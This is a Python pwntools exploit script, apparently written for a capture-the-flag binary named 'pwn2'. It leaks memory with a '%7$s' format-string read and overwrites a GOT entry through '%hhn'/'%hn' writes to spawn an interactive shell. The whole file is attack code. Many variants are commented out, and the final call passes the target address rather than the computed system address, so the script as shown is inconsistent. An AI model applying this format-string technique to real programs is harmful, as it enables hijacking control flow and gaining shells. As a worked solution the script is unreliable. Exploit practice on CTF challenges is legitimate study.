#!/usr/bin/env python
from pwn import *
import binascii
p = process("./pwn2_592abf99e13a55b21488b85d7484c3a2")
gdb.attach(p)

addr = 0x804a010

def leak(addr):
    payload = p32(addr) + '%7$s.TMP'
    # payload = "%3$s.TMP"
    p.send(payload)
    rec = p.recvuntil(".TMP")
    rec = rec[4:8]
    return rec
    # return binascii.hexlify(rec)
    # p.interactive()

def attack(sys_addr):
    num1 = sys_addr & 0xff 
    num2 = (sys_addr & 0xffff00) >> 8
    # print hex(num1)
    # payload = p32(addr) + p32(addr+1) + "%" + str(num1) + "x" + "%7$hn" + "%" + str(num2 - num1) + "x" + "%8$hn"
    # payload = p32(addr) + "%" + str(num1) + "x" + "%7$hhn"
    # payload = p32(addr) + p32(addr+1) + "%" + str(num1 - 8) + "x" + "%7$hn" 
    # payload = p32(addr) + p32(addr+1) + "%" + str(num1 - 8) + "x" + "%7$hhn" 
    #2 payload = p32(addr) + p32(addr+1) + "%" + str(num2 - 8) + "x" + "%8$hhn"
    # payload = p32(addr) + p32(addr+1) + "%" + str(num2 - 8) + "c" + "%8$hn"
    payload = p32(addr) + p32(addr+1) + "%" + str(num1 - 8) + "x" + "%7$hhn" + "%" + str(num2 - num1) + "x" + "%8$hn" 
    p.send(payload)
    p.recv()
    # p.send("/bin/bash")
    p.interactive()

'''
libc_addr = u32(leak(addr)) - 0x00049670
system_addr = libc_addr + 0x0003ada0
print hex(system_addr)
print (system_addr)
'''
attack(addr)

